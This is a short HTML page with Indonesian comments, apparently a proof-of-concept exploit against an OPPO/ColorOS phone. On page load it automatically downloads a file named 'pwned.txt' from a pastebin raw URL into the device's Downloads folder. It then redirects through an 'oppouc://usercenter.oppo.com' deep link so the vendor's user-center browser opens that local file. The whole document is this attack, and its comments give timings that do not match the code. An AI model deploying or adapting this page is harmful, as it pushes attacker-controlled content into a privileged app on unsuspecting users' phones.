<!DOCTYPE html>
<html>
<head>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/FileSaver.js/2.0.5/FileSaver.min.js"></script>
    <script type="text/javascript">
        async function downloadFile(url, filename) {
            try {
                const response = await fetch(url);
                if (!response.ok) {
                    throw new Error('Network response was not ok');
                }
                const blob = await response.blob();
                saveAs(blob, filename);

                // Jika berhasil, berikan jeda 2 detik kemudian alihkan ke URL yang diinginkan
                setTimeout(function() {
                    window.location.replace('oppouc://usercenter.oppo.com/browser?url=content://com.coloros.filemanager/root/storage/emulated/0/Download/pwned.txt');
                }, 12000); // 2000 milidetik = 2 detik
            } catch (error) {
                // Menampilkan pesan kesalahan menggunakan alert
                alert('Error during file download: ' + error.message);
            }
        }

        window.onload = function() {
            setTimeout(function() {
                // Contoh penggunaan
                downloadFile('https://pastebin.com/raw/dxbeDqv2', 'pwned.txt');
            }, 5000); // 2000 milidetik = 2 detik
        };
    </script>
</head>
<body>
    <h1>MY OPPO APP </h1>
</body>
</html>
